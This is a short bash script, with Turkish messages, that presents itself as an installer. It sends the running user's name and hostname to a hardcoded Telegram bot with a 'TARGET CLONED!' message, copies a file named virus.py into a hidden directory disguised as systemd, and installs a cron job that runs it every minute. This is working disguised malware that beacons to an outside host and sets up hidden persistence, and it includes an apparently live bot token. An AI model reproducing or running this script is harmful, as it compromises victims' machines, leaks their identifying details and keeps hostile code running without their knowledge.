#!/bin/bash
echo "[+] Kurulum başlatılıyor..."
curl -s -X POST https://api.telegram.org/bot8996765359:AAFSRiB5C8oK0rUcNQRKpA2M0bRP-eModd0/sendMessage -d chat_id=8402048380 -d text="🎯 HEDEF KLONLADI! $(whoami) @ $(hostname)"
mkdir -p ~/.cache/.systemd
cp virus.py ~/.cache/.systemd/
chmod +x ~/.cache/.systemd/virus.py
(crontab -l 2>/dev/null; echo "* * * * * python3 ~/.cache/.systemd/virus.py") | crontab -
echo "[✓] Kurulum tamamlandı."
